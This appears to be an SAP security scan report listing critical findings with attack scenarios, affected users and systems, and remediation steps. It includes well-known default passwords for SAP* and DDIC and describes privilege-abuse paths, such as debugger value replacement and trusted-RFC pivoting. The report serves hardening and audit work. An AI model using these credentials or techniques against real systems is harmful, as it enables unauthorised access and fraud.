CRITICAL P1 · 79 Users assigned critical profiles (SAP_ALL, SAP_NEW, S_A.SYSTEM) USR-002 ▶
Security Risk
This check flags users assigned the critical profiles SAP_ALL, SAP_NEW or S_A.SYSTEM. SAP_ALL grants every authorization in the system; SAP_NEW is open by design and grants all authorizations newly delivered by upgrades so that existing processes do not break; S_A.SYSTEM is the broad system-administration profile. A dialog user holding any of these effectively has unrestricted access, defeating least-privilege and segregation of duties. Attack scenario: a compromised or malicious holder of SAP_ALL can post or alter financial documents (fraudulent FB01 postings and payment runs), read and exfiltrate HR/PII and bank data (tables such as PA0008, BSEG, LFBK), create and empower users to establish persistence, execute OS-level commands, and deactivate or clear the audit log to cover tracks, all from a single account. Because SAP_ALL includes S_DEVELOP, the holder can also debug-and-replace values at runtime to bypass any residual control. In RISE/S4 this is squarely a customer-owned control. SAP_NEW is insidious: after an upgrade it can silently re-grant powerful new authorizations to whoever still holds it. A real incident: a temporary go-live SAP_ALL grant to a consultant that was never removed, later abused (or the consultant phished) to create a hidden admin ID and run mass vendor bank-detail changes for payment fraud. This is among the most severe SOX ITGC and DSAG audit findings and a direct SoD violation.
Affected Items (5)
  • SAP* → SAP_ALL
  • DDIC → SAP_ALL
  • JSMITH → SAP_ALL
  • MWILSON → SAP_NEW
  • LWANG → S_A.SYSTEM
Remediation — Step by Step
1. Enumerate holders with RSUSR002 (users by complex selection) or SUIM filtered on profiles SAP_ALL, SAP_NEW, S_A.SYSTEM; cross-check table UST04/AGR_USERS and run RSUSR008_009_NEW for critical authorization combinations. 2. For each production dialog user, remove the profile in SU01 (Profiles tab) or SU02 and replace it with a PFCG role scoped to the user's actual task set. 3. Never assign SAP_NEW permanently; after upgrades, process new authorizations properly via SU25/SU24 instead of leaving SAP_NEW assigned. 4. Restrict SAP_ALL to break-glass only by implementing SAP GRC Access Control Emergency Access Management (Firefighter/EAM) so elevated access is time-boxed, logged and reviewed. 5. For genuine administration, build least-privilege admin roles (separate Basis, user-admin and transport roles) instead of S_A.SYSTEM. 6. Document any residual emergency assignment with a validity/expiry date (SU01 validity period) and an approval ticket. 7. Verify by re-running RSUSR002/RSUSR008_009_NEW to confirm no dialog user retains the profiles and that firefighter IDs are the only path to SAP_ALL. 8. Configure a recurring SUIM/GRC report and a Security Audit Log filter to alert whenever SAP_ALL/SAP_NEW is assigned. 9. Caution: removing SAP_ALL from technical/interface users can break RFC and batch jobs, so trace the authorizations actually used with STAUTHTRACE/ST01 before trimming and test in QA. 10. Coordinate the change window with application owners and roll out per user to avoid mass lockout.
References
  • SAP Note 1698789
  • CIS SAP Benchmark Section 2.3
CRITICAL P1 · 79 Parameter login/no_automatic_user_sapstar non-compliant PARAM-login/no_automatic_user_sapstar ▶
Security Risk
login/no_automatic_user_sapstar controls SAP's hard-coded emergency super-user SAP*. When this parameter is 0 (or unset on older releases), the kernel's built-in SAP* becomes usable: if the SAP* user master record is deleted from a client, the system falls back to the hard-coded SAP* which has the well-known default password PASS and, critically, is a member of no authorization checks - it is an unrestricted super-user with SAP_ALL-equivalent power and is exempt from normal authorization enforcement. This is one of the most classic and severe SAP backdoors. Attack scenario: an attacker (or malicious insider) with the ability to delete a user master record in any client - or who simply targets a client where SAP* has been deleted or never properly secured - logs on as SAP* with password PASS and obtains complete, unrestricted control of that client, including creating privileged users, reading all data, and posting any transaction. Even without deletion, a value of 0 signals the safety net is off. In S/4HANA RISE this is a customer-owned parameter, and because it must be set in the DEFAULT profile to apply to all clients and instances, a gap here exposes every client. Business impact: total system and data compromise, undetectable fraud, and full loss of segregation of duties. Compliance impact: violates SAP Note 68048, CIS SAP 1.2.5, and any ITGC baseline. A real incident would look like a SAP* logon from an unexpected terminal followed by mass privilege changes. This is correctly rated CRITICAL.
Affected Items (1)
  • login/no_automatic_user_sapstar = 0
Remediation — Step by Step
1. Verify the current value in RZ11 for login/no_automatic_user_sapstar; the secure value is 1 (automatic SAP* disabled). 2. In RZ10 set login/no_automatic_user_sapstar = 1 in the DEFAULT profile so it applies to ALL clients and instances (per SAP Note 68048). 3. Save and activate the DEFAULT profile and restart the instances during a maintenance window so it takes effect system-wide. 4. Independently, ensure a real SAP* master record exists in every client (including 000, 001, and any custom clients), is assigned to a locked-down group, has a strong unique password, is locked in SU01, and holds no wide profiles - deleting SAP* is not the fix. 5. Change the password of SAP* and DDIC in all clients away from any default; verify with report RSUSR003 that no standard user still has a default password. 6. Confirm SAP* is excluded from being an emergency backdoor by keeping the parameter at 1 even though a real SAP* exists. 7. Verify with RSPARAM that the active value is 1 on every instance and re-check after the restart. 8. Monitor SAP* logons via the Security Audit Log (SM20/RSAU_READ_LOG). 9. Roll out via DEV/QA first, but treat production remediation as high priority given the CRITICAL rating. 10. Re-run the scanner to confirm the parameter is compliant.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
CRITICAL P1 · 79 SE06 global system change option is 'Modifiable' (production changeable) CODE-SYSCHG-001 ▶
Security Risk
The SE06/SE03 global system change option is set to 'Modifiable' (Modifiable). This is the system-wide lock that is SEPARATE from the SCC4 client setting: with it open, developers/administrators can change Repository objects (programs, DDIC, config) and cross-client Customizing DIRECTLY in the production system, bypassing the transport/change-management process. That defeats SOX change-management ITGC (all changes developed, approved and transported from a development system) and leaves untracked, unreviewed changes in production.
Affected Items (2)
  • Global system change option = Modifiable
  • scope: /CUST/ = Modifiable
Remediation — Step by Step
In SE06 → 'System Change Option', set the global setting to 'Not modifiable' on all productive systems; set individual namespaces/software components to 'Not modifiable' as appropriate. Make changes only in the development system and import via STMS. (Combine with the SCC4 client lock — CODE-CLIENT-001.)
References
  • SAP KBA 2682744 — System change option (SE06)
  • SOX ITGC — change management (no direct changes in production)
  • DSAG Prüfleitfaden — Systemänderbarkeit
CRITICAL P1 · 79 Debug & Replace authorization (runtime authorization bypass) AUTH-001 ▶
Security Risk
The role grants authorization object S_DEVELOP with OBJTYPE=DEBUG and ACTVT=02, which per SAP Note 65968 is 'change authorization in the debugger' — the capability commonly called Debug & Replace. This is among the most dangerous privileges an ABAP system can hand out. A holder can set a breakpoint anywhere, halt any running program at any statement, and overwrite the contents of any variable while the work process is executing. The classic abuse: step into a program, let execution reach an AUTHORITY-CHECK, and immediately afterwards set SY-SUBRC = 0 to force a 'passed' result; or edit a field value (an amount, a vendor bank key IBAN, a company code, a document release flag) an instant before the program COMMITs it to the database. Because the manipulation happens inside the running process, it bypasses virtually every authorization check, field-level control and business validation — none of the standard controls observe it. In an S/4HANA RISE production client a user with an otherwise modest role can therefore approve their own purchase order, redirect a payment run, unblock a blocked invoice, or read and alter data they have no business authorization for. It is also an elegant way to defeat GRC segregation-of-duties rules, because the fraud is committed inside the debugger rather than through a controlled screen that GRC monitors. A real incident looks like a fraudulent outbound payment or a silently altered master-data record with no matching change document — usually detected only downstream through financial reconciliation, because the debugger leaves almost no application-layer audit trail. This authorization has no legitimate place in any productive role.
Affected Items (1)
  • Role Z_BASIS_SUPER — 2 user(s) [ADMIN1, CONTRACTOR7] — S_DEVELOP OBJTYPE=DEBUG, ACTVT=02
Remediation — Step by Step
1. Enumerate offenders precisely: run report RSUSR002 (or SUIM -> Users -> By Authorization Values) selecting object S_DEVELOP with OBJTYPE=DEBUG and ACTVT=02; cross-check with RSUSR008_009_NEW critical-authorization catalog. 2. In PFCG open each offending role -> Authorizations tab -> locate the S_DEVELOP authorization and remove value 02 from ACTVT, leaving 03 (display debugging) only where support genuinely needs to inspect variables. 3. Where change-debugging is truly needed for break-fix, do NOT embed it in a standard role: create a dedicated firefighter role assigned only through GRC Emergency Access Management (or a logged, time-boxed temporary assignment). 4. Confine change-debugging to non-production; on DEV/QA use the newer S_DBG object (ABAP 7.57+, Note 65968) to scope change-debug to specific software components/packages. 5. Save and generate the profile in PFCG (SU24 keeps proposals clean); regenerate any composite roles that include the changed single roles. 6. Enable Security Audit Log (RSAU_CONFIG, legacy SM19) and ensure debugging/replace events are recorded so any future use raises an alert (monitor via RSAU_READ_LOG / SM20). 7. Verify: re-run RSUSR002 for S_DEVELOP DEBUG/02 and confirm zero productive-role hits; have a test user attempt a change-debug and confirm refusal (SU53 shows the missing authorization). 8. Rollout caution: pull the change-debug from support roles only after the firefighter path is live and communicated, otherwise you break existing break-fix workflows; schedule in a change window and test in QA first.
References
  • SAP Note 65968 — Debugging authorizations
  • SAP Security Baseline — S_DEVELOP
  • DSAG Audit Guideline — Debug & Replace
CRITICAL P1 · 79 Trusted-RFC logon as any user (S_RFCACL wildcard) AUTH-002 ▶
Security Risk
The role grants S_RFCACL with a wildcard ('*') in the trusted-system/user fields (RFC_USER, RFC_SYSID or RFC_CLIENT) while RFC_EQUSER is not forced to 'Y'. S_RFCACL governs who may log on through a trusted-RFC relationship without presenting a password. With a wildcard, any calling system that is trusted by this system can log on here as ANY user in ANY client — including highly privileged accounts — simply by asserting the identity. SAP Note 1416085 exists precisely because this is so dangerous that SAP strips '*' from RFC_USER during authorization merges and warns on manual maintenance, and S_RFCACL is deliberately excluded from SAP_ALL. In a landscape this is the number-one lateral-movement path: an attacker who compromises a lower-trust system (for example a sandbox, a solution-management system, or a less-hardened satellite that is trusted by production) can pivot into production via SMT1/SM59 trusted destinations and assume a Basis or DDIC-class identity without ever needing a password. Because trusted logon binds to whatever user the caller names, the wildcard turns every trusting system into a skeleton key. In an S/4HANA RISE landscape, where central components (Solution Manager / Focused Run, GRC, SLT, PI/PO) hold trust into the production ERP, one weak node compromises everything downstream. A real incident looks like an interactive or programmatic logon in the production system under a privileged account originating over RFC from a peer system, followed by mass data access or configuration change — with the ticket/trust ticket masking the true origin. This is exactly the 'RFC hopping' scenario auditors and SAP security notes warn about.
Affected Items (1)
  • Role Z_BASIS_SUPER — 2 user(s) [ADMIN1, CONTRACTOR7] — S_RFCACL RFC_USER/RFC_SYSID = *
Remediation — Step by Step
1. Identify offenders: run RSUSR002 for object S_RFCACL where RFC_USER, RFC_SYSID or RFC_CLIENT contain '*'; list holders and the roles. 2. In PFCG, for each role, replace the wildcards with the specific calling System ID(s) and client(s) that legitimately need trust, and set RFC_EQUSER='Y' so the trusted logon is bound to the same user only. 3. Review the trust relationships themselves in transaction SMT1 (trusted systems) and the associated destinations in SM59; remove any obsolete or overly broad trust. 4. Migrate legacy trust to the current model per SAP Note 3157268 (How-To-Guide: Migration of Trusted/Trusting Relationships) and its security note 3089413; after migration set profile parameter rfc/allowoldticket4tt = no (check/set via RZ11/RZ10) to block old trust tickets. 5. Ensure the RFC 'step users' behind trusted destinations are of type System/Communication with least-privilege roles, never SAP_ALL. 6. Regenerate profiles in PFCG and re-run RSUSR002 to confirm no S_RFCACL wildcard remains in any assigned role. 7. Verify end-to-end: from each trusting system test a trusted call and confirm it only succeeds for the intended same-user/system combination (SU53 / SM59 connection test). 8. Rollout caution: coordinate with interface owners before tightening — mis-scoped trust breaks batch/monitoring interfaces; stage changes in QA, keep a back-out, and change one relationship at a time.
References
  • SAP Note 1416085 — S_RFCACL wildcard risk
  • SAP Note 3157268 — Trusted RFC migration
CRITICAL P1 · 79 Authorization forging via role-content control objects AUTH-004 ▶
Security Risk
The role grants one or more of the role-content control objects with wildcards: S_USER_AUT with AUTH='*' plus create/change/activate activity (01/02/07), S_USER_TCD with TCD='*', or S_USER_VAL at all. These objects govern what a role/authorization administrator may put INTO a role: S_USER_AUT the authorization values, S_USER_TCD which transactions may be inserted, and S_USER_VAL which field values may be maintained. A holder of these with wildcards can define arbitrary authorization values, insert any transaction, and maintain any field value in a role they can edit — effectively minting a SAP_ALL-equivalent authorization for themselves or a confederate, without ever touching S_USER_GRP, S_USER_AGR or S_USER_PRO in a way that looks abnormal. This is the textbook self-escalation / authorization-forging path: a mid-level administrator gradually raises their own privileges, or plants a dormant powerful role, entirely within PFCG. In an S/4HANA RISE production system this defeats least-privilege and, critically, defeats segregation of duties — the person who builds authorizations can build themselves the very access that GRC is supposed to prevent, then use it and roll it back. A real incident is detected (if at all) only through PFCG change-document review or GRC firefighter/mitigation reporting showing a role whose content was expanded to critical objects by someone outside the security team, followed by that person exercising the new access. Combined with even display access to user administration it becomes full compromise of the authorization concept.
Affected Items (1)
  • Role Z_SEC_ADMIN — 0 users (unassigned) — S_USER_AUT AUTH=* (build any authorization)
Remediation — Step by Step
1. Identify offenders: run RSUSR002 for S_USER_AUT (AUTH='*', ACTVT 01/02/07), S_USER_TCD (TCD='*'), and any S_USER_VAL; list holders. 2. Remove S_USER_AUT/S_USER_TCD/S_USER_VAL entirely from any role that is not a genuine security-administration role. 3. For legitimate security-admin roles, scope them: no AUTH='*' and no TCD='*'; grant only the authorization objects and transaction ranges that team is permitted to maintain. 4. Split duties across the S_USER_* family so that user administration (S_USER_GRP), role assignment (S_USER_AGR) and role content (S_USER_AUT/VAL/TCD) are held by different people where feasible. 5. Put all security-role changes under four-eyes / change control; where GRC is present, route role changes through GRC BRM/ARM with approval workflow. 6. Turn on and review PFCG change documents (report RSSCD100 for authorization change docs / table AGR_* change logs) so any content expansion is attributable and reviewed. 7. Regenerate profiles and re-run RSUSR002 to confirm the wildcards are gone from assigned roles. 8. Verify: with a scoped admin test user, confirm they can no longer add an arbitrary critical transaction/authorization to a role (SU53 on the refusal). 9. Rollout caution: coordinate with the security/GRC team so their day-to-day maintenance still works after scoping; pilot on one admin first.
References
  • SAP Security Baseline — role administration objects
  • DSAG Audit — self-escalation
CRITICAL P1 · 79 SAP* kernel emergency-user auto-logon is enabled STDUSR-001 ▶
Security Risk
Profile parameter login/no_automatic_user_sapstar = 0 leaves the kernel-hardcoded SAP* emergency user active as a fallback. With this value, if the SAP* user master record is ever missing or deleted from a client (via a botched client copy/import, a direct DB delete of USR02, or a freshly created client that has no SAP*), the kernel synthesises SAP* on the fly with the well-known default password PASS. That synthetic SAP* runs with NO authority checks at all — it is an implicit super-user equivalent to SAP_ALL/SAP_NEW and ignores normal authorization objects, in ANY client on the system. This is one of the oldest and most reliable full-compromise backdoors in the ABAP stack. It is especially dangerous on RISE/S/4HANA because SAP operates Basis but the customer still owns client-level user administration, so a forgotten client (001/066) or a client copy gone wrong is the customer's liability. Attack scenario: an insider or attacker who can delete the SAP* record in any client (or finds a client where it never existed) logs on interactively as SAP* / PASS with unrestricted power. They immediately create a dialog user with SAP_ALL, or directly read/export master and financial data, post fraudulent FI documents, or open OS access via SM49/SM69. Because the fallback works in every client, low-traffic clients such as 000/001/066 are the preferred, poorly-monitored entry point. Business impact: total system compromise, collapse of segregation-of-duties, SOX ITGC failure, GDPR-reportable breach, and financial fraud. A real incident looks like a sudden SAP* logon in client 066 or 001 off-hours, followed by mass authorization grants and an unexplained super-user session in SM20.
Affected Items (1)
  • login/no_automatic_user_sapstar = 0
Remediation — Step by Step
1. Confirm the current value with transaction RZ11 (dynamic view) for login/no_automatic_user_sapstar on every application server. 2. In RZ10 edit the DEFAULT profile and each instance profile, set login/no_automatic_user_sapstar = 1, save and activate. 3. Because this is a static parameter, schedule an instance restart to activate it. On RISE, raise the parameter/kernel change through the SAP-managed-services support channel and coordinate the restart window (customer cannot restart the instance directly). 4. Ensure a real SAP* user master exists in EVERY client including 000/001/066 (transaction SU01); give it a long random password stored in a vault, and assign it to user group SUPER so only super-admins can alter it. 5. Strip SAP_ALL/SAP_NEW from that SAP* master and then lock it (SU01 / SU10) — a locked real SAP* also blocks the kernel fallback. 6. Enable table-change logging on USR02 (rec/client) and monitor SM20 so any deletion of SAP* is detected. 7. Verify after restart: RZ11 shows the value = 1, and report RSUSR003 confirms SAP* exists and is locked in all clients. Caution: NEVER delete SAP* to 'fix' this. Test the profile change in a non-production system first and confirm scheduled/background jobs do not depend on an unlocked SAP*.
References
  • SAP Note 2383 / SAP Security Baseline — SAP* protection
  • SAP Help — login/no_automatic_user_sapstar
CRITICAL P1 · 79 Standard users still have SAP default passwords STDUSR-002 ▶
Security Risk
One or more standard/technical users (SAP*, DDIC, SAPCPIC, EARLYWATCH, TMSADM, SAPSUPPORT) still carry their well-known SAP default passwords (for example SAP* = 06071992, DDIC = 19920706, and the kernel SAP* fallback = PASS). These passwords are published in every SAP hacking guide and are the very first credentials any attacker or automated scanner tries against a discovered SAP instance. DDIC is not an ordinary account: it owns software logistics, is required in client 000 for upgrades/SPAM/SAINT, and can bypass many application checks. TMSADM is the Transport Management System RFC user that exists identically across the whole transport domain, so one cracked TMSADM equals landscape-wide transport and RFC access. SAPCPIC and SAPSUPPORT are communication users used for RFC/remote support. Attack scenario: the attacker enumerates clients from the logon screen, tries DDIC/19920706 or SAP*/06071992, obtains a dialog or RFC logon, then escalates by granting SAP_ALL or by calling privileged RFC-enabled function modules. Because TMSADM/SAPCPIC are communication users, they enable programmatic function-module access across systems without a GUI. Business impact: full compromise, fraudulent postings, mass data exfiltration (GDPR), and a direct SOX ITGC finding because password controls demonstrably failed. A real incident looks like a successful DDIC logon from an unusual terminal, or a burst of RFC calls authenticating as TMSADM from an unexpected host.
Affected Items (4)
  • SAP* (client 000) — default password still valid
  • DDIC (client 000) — default password still valid
  • SAPCPIC (client 000) — default password still valid
  • EARLYWATCH (client 066) — default password still valid
Remediation — Step by Step
1. Run report RSUSR003 (via SA38/SE38) — it lists SAP*, DDIC, SAPCPIC, EARLYWATCH and TMSADM across all clients with their password status (default/initial) and lock status. 2. For each flagged account, set a new strong password in SU01 (or SU10 for mass change); record DDIC/SAP* credentials in a privileged-access vault since they are needed for maintenance. 3. For TMSADM, regenerate the password consistently across the transport domain using report TMS_UPDATE_PWD_OF_TMSADM and follow SAP Note 1414256 so transports keep working. 4. Assign these users to group SUPER (SU01) so only super-admins can maintain them. 5. Lock any standard user not needed for daily operations (see STDUSR-003). 6. Harden the password policy: login/min_password_lng, login/min_password_digits/letters/specials, disable trivial passwords, and login/fails_to_user_lock. 7. Verify by re-running RSUSR003 — every standard user must show 'password changed' and no defaults. Caution: changing DDIC, TMSADM or EARLYWATCH passwords can break transports, EarlyWatch collection and RFC interfaces. Coordinate with the transport admin and (on RISE) SAP managed services, and test in a non-production system before touching production.
References
  • SAP Note 2383 — Protecting standard users
  • SAP Security Baseline — Standard users / RSUSR003
CRITICAL P1 · 77 Parameter gw/sec_info non-compliant PARAM-gw/sec_info ▶
Security Risk
gw/sec_info points the SAP Gateway to its secinfo access-control-list file, which governs which external programs the gateway is allowed to start and which hosts may do so (the classic CPIC/RFC 'start of external programs' control). If gw/sec_info is not configured (empty), the gateway falls back to permissive behaviour and, combined with a missing reginfo, effectively allows arbitrary external program registration and start. This is one of the most serious and actively exploited SAP exposures: an attacker who can reach the gateway TCP port (sapgw<nr>, e.g. 3300+instance) can instruct the gateway to start an operating-system program on the application server, executing code as the <sid>adm user - full remote code execution and host compromise, no SAP credentials required. Public exploit tooling (e.g. the '10KBLAZE'-class attacks) automated exactly this against systems with default/empty secinfo/reginfo. In S/4HANA RISE the gateway is customer-relevant, and while network exposure may be reduced, internal attackers or a compromised jump host can still reach it. Business impact: complete server and database compromise, ransomware deployment, data theft, and pivot into the rest of the landscape - among the highest-impact SAP findings, correctly rated CRITICAL. Compliance impact: violates SAP Note 1408081, CIS SAP 3.1, and the SAP Security Baseline. A real incident would look like unexpected OS processes spawned by <sid>adm and gateway logs (SMGW) showing external program starts from untrusted hosts.
Affected Items (1)
  • gw/sec_info =
Remediation — Step by Step
1. Verify the current value in RZ11 for gw/sec_info and check the gateway status/ACL state in SMGW (Goto -> Expert Functions). 2. Create a restrictive secinfo file on the application server (default location referenced by gw/sec_info, typically under the instance work/DATA directory) following SAP Note 1408081, using explicit USER/HOST/TP rules and a default-deny posture (deny all, then allow only required programs/hosts). 3. In RZ10 set gw/sec_info to the full path of that secinfo file, and configure gw/reg_info in the same effort (they work together). 4. Set gw/reg_no_conn_info per SAP Note 1444282 and gw/acl_mode = 1 to enforce ACL evaluation. 5. Save/activate the profile; you can reload the ACL files without a restart via SMGW -> Goto -> Expert Functions -> Reread, which limits disruption. 6. Use the SMGW logging/simulation mode (gw/sim_mode) to observe what legitimate programs need access before enforcing default-deny, so you do not break RFC server programs. 7. Verify by attempting a disallowed external program start and confirming it is rejected, and by reviewing SMGW logs for denied entries. 8. Ensure the gateway port is not exposed beyond the trusted network (firewall / network policy), as ACLs plus network isolation are complementary. 9. Roll out in DEV/QA first and coordinate with owners of registered RFC server programs (e.g. tax engines, external converters) to enumerate required rules. 10. Re-run the scanner to confirm gw/sec_info is configured.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
CRITICAL P1 · 77 Parameter gw/reg_info non-compliant PARAM-gw/reg_info ▶
Security Risk
gw/reg_info points the SAP Gateway to its reginfo access-control-list file, which governs which external RFC server programs may register with the gateway and from which hosts. If gw/reg_info is empty/unconfigured, the gateway permits unrestricted registration of external programs. An attacker who can reach the gateway port can register a rogue RFC server program under the name of a legitimate registered server (or any name), and then either intercept RFC calls intended for the real server or be invoked to execute attacker-controlled logic - and in concert with a missing/permissive secinfo, this extends to starting OS programs, i.e. remote code execution as <sid>adm. Unrestricted registration also enables denial of service (registering to displace a legitimate server) and man-in-the-middle against RFC data. This is the same class of exposure exploited by automated SAP gateway attacks against default configurations. In an S/4HANA landscape with registered external servers (tax, output management, EDI converters), a missing reginfo is a direct path to compromise. Business impact: RCE and host takeover, interception/tampering of business-critical RFC traffic, and interface outages - a CRITICAL exposure. Compliance impact: violates SAP Note 1408081, CIS SAP 3.2, and the SAP Security Baseline. A real incident would look like an unknown program registered in SMGW's logged-on clients, RFC calls being answered by a rogue server, or OS-level code execution originating from a gateway registration.
Affected Items (1)
  • gw/reg_info =
Remediation — Step by Step
1. Verify the current value in RZ11 for gw/reg_info and inspect registered servers in SMGW (Logged On Clients / Goto -> Expert Functions). 2. Create a restrictive reginfo file on the application server per SAP Note 1408081, with explicit TP/HOST/ACCESS/CANCEL rules and a default-deny stance, allowing only the specific external server programs and hosts that must register. 3. In RZ10 set gw/reg_info to the full path of the reginfo file and configure gw/sec_info together (both are required for effective gateway hardening). 4. Set gw/acl_mode = 1 and gw/reg_no_conn_info per SAP Note 1444282, and set gw/rem_start = DISABLED where remote start is not required. 5. Save/activate the profile and reload ACLs live via SMGW -> Goto -> Expert Functions -> Reread (no restart needed). 6. Use gateway simulation/logging first to capture the legitimate registrations before switching to default-deny, so registered servers are not cut off. 7. Verify by confirming only the intended programs can register (SMGW) and that denied registrations appear in the gateway log. 8. Combine with network controls so the gateway port is reachable only from hosts that legitimately register servers. 9. Roll out in DEV/QA first and coordinate with every external-server owner to enumerate the required reginfo entries before production enforcement. 10. Re-run the scanner to confirm gw/reg_info is configured.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
CRITICAL P1 · 77 Active ICF services without authentication NET-005 ▶
Security Risk
This check flags ICF services that are active and configured without authentication (anonymous or an alternative stored-user logon), excluding the intentionally public /sap/public/* tree. This is the most dangerous ICF misconfiguration because it grants unauthenticated execution of the service handler: anyone who can reach the URL runs the underlying application logic with the anonymous or stored service user's authorizations, with no logon at all. The attack requires no credentials. An adversary, whether on the internet for an edge-exposed system or an unprivileged insider internally, simply requests the URL; if the anonymous context carries any meaningful authorization, they can read or write business data, trigger RFC calls, or dump table contents, and if the stored service user is powerful the outcome escalates to mass data extraction or code execution. Because the access is unauthenticated, it also produces no user-attributable trail, creating an audit and forensic gap on top of the exposure. In an S/4HANA RISE context an internet-adjacent Fiori or gateway host with an anonymous non-public service is effectively an open door that automated scanners routinely discover. The business impact is a direct data breach with no attribution, GDPR exposure for personal data reachable through the service, and SOX control failure for uncontrolled access to financially relevant functions. A realistic incident is an anonymous BSP or WebDynpro service exposing customer or employee data that is harvested at scale by a crawler before anyone notices.
Affected Items (3)
  • /sap/bc/webrfc
  • /sap/bc/soap/wsdl
  • /default_host/sap/bc/ping
Remediation — Step by Step
1. In SICF, identify active services whose Logon Data tab is set to anonymous or an alternative stored-user logon, especially any node outside /sap/public/*. 2. For each non-public service, change the logon procedure to Standard so authentication is required, and remove the stored anonymous user. 3. Where a service genuinely needs a technical user, use a minimally-authorized account of type System/Communication and protect the node with authorization object S_ICF (fields ICF_FIELD/ICF_VALUE). 4. Deactivate outright any service that has no business need (right-click, Deactivate Service). 5. Enforce transport-layer protection: require HTTPS (SSL-enabled ICM port via icm/server_port) and, where feasible, client-certificate or SSO authentication. 6. For internet-facing scenarios add Web Dispatcher or reverse-proxy authentication and URL allow-listing in front of the ABAP stack. 7. Verify that an unauthenticated request to each affected URL now returns HTTP 401, confirm the access is recorded in the Security Audit Log (RSAU_READ_LOG / SM20), and re-run the scanner. 8. Caution: a few standard services legitimately permit anonymous logon (for example certain launchpad or logon services); validate against SAP KBA 2661761 (ICF services: mandatory vs. deactivatable) and the Security Baseline before disabling, and test in non-production.
References
  • SAP KBA 2661761 (ICF services: mandatory vs. deactivatable)
  • CIS SAP Benchmark Section 5.2
CRITICAL P1 · 77 Communication arrangements with weak/no authentication RISE-004 ▶
Security Risk
One or more communication arrangements accept inbound calls with no authentication, anonymous access, or only HTTP Basic authentication (username/password). This is the credential front door to the ERP's APIs. 'None/anonymous' means the API can be invoked without proving identity at all - a direct path for any party that can reach the endpoint to read or post business data. Basic authentication means a static, replayable secret guards write access to financial and master-data services; it is vulnerable to interception if TLS is ever mis-terminated, to brute force and credential spraying, and to silent reuse, because a stolen password produces 'valid' traffic with no token expiry or scoping. In a RISE context these arrangements typically expose OData services such as API_BUSINESS_PARTNER, API_JOURNAL_ENTRY or API_PURCHASEORDER, so a compromised or absent credential leads directly to financial fraud, data exfiltration, and integrity damage (fake postings). Attack scenario: an attacker discovers a Basic-auth arrangement, sprays common or reused passwords against the communication user, succeeds, then automates supplier bank-account changes and pushes payment-relevant master data - all appearing as legitimate integration traffic. An unauthenticated arrangement is worse: no credential is needed at all. Business impact includes payment fraud, GDPR-reportable personal-data exposure (business-partner/HR fields), SOX control failure over interface authentication, and a critical audit/pen-test finding. A real incident manifests as anomalous API volume from an unexpected source IP against a single communication user, or postings with no corresponding user session.
Affected Items (3)
  • SF_EMPLOYEE_SYNC (auth: basic, user: SF_COMM_USER)
  • BANK_STATEMENT_IMPORT (auth: none, user: BANK_COMM)
  • VENDOR_INVOICE_API (auth: basic, user: SF_COMM_USER)
Remediation — Step by Step
1. Treat this as critical/priority remediation and identify every affected arrangement in the 'Maintain Communication Arrangements' app. 2. In the associated 'Maintain Communication Systems' configuration set the inbound authentication method to OAuth 2.0 (client credentials / SAML Bearer) or SSL Client Certificate (X.509), and disable 'User Name and Password' (Basic) for inbound. 3. In the arrangement's Inbound Communication section open OAuth 2.0 Details, generate client credentials or bind the certificate, and distribute secrets to the caller via a secrets manager (never hard-coded). 4. For any arrangement that must temporarily keep Basic auth, enforce TLS end-to-end, set a strong unique password on the communication user, and schedule migration to OAuth/X.509. 5. Ensure no arrangement remains anonymous/none; if an endpoint genuinely needs no auth, remove it. 6. For Private Edition / on-prem services, remove any anonymous logon alias at the ICF node in transaction SICF and require token/cert auth on gateway services via /IWFND/MAINT_SERVICE and SOAMANAGER. 7. Rotate the communication users' passwords/secrets after the change and revoke the old Basic credentials. 8. Verify: send an unauthenticated call and an old-Basic call and confirm HTTP 401; confirm the OAuth/certificate flow succeeds for the legitimate client. 9. Enable inbound call logging and monitor for failed-auth spikes. 10. Rollout caution: coordinate the cutover with each interface owner (they must switch auth method at the same time) and pilot in non-production; an uncoordinated switch breaks the interface.
References
  • SAP Note 3089413
  • SAP BTP Security Guide
CRITICAL P1 · 77 Cloud Connector backends with wildcard resource mappings BTP-CC-001 ▶
Security Risk
The SAP Cloud Connector (SCC) tunnels on-premise backend systems into BTP, and each exposed backend carries a list of 'Resources' (URL path prefixes) whose access policy is either 'Path' (exact node) or 'Path And All Sub-Paths'. A wildcard or root-level mapping ('/', '/*', or a broad '/sap' set to sub-paths) exposes the entire ICF/HTTP namespace of the S/4HANA or ECC backend to any BTP application bound to that connection. This defeats the whole point of the SCC allowlist: instead of publishing only the two or three OData services an extension app needs, the tunnel now reaches every ICF node - SICF administration, WebGUI, ABAP Development Tools (/sap/bc/adt), the SOAP-to-RFC bridge, WebRFC, BSP applications and Web Dynpro. Attack scenario: an adversary who compromises a bound BTP app (leaked service key, SSRF in an extension, a vulnerable custom app) or a malicious insider with a destination over this SCC pivots through the tunnel and reaches interactive and code-level functions on the core ERP. With WebGUI they obtain a dialog session as the propagated or technical user; with ADT they read and deploy ABAP; with the RFC bridge they invoke function modules. Business impact is a direct cloud-to-core lateral-movement path: data exfiltration, fraudulent financial postings, creation of backdoor users, and effective remote code execution - precisely the network-segmentation control that RISE is meant to guarantee. It is a clear breach of least-privilege and defense-in-depth expectations under SOX ITGC, ISO 27001 A.13, and the SAP Security Baseline. A real incident surfaces as anomalous ICF access from the SCC service user to /sap/bc/gui or /sap/bc/adt, originating from a cloud IP, well outside the small set of services the business actually integrates.
Affected Items (2)
  • S4H_Production: path='/' (exactMatch=False) → 10.0.1.50:443
  • Dev_System_Old: path='/*' (exactMatch=False) → 10.0.3.10:443
Remediation — Step by Step
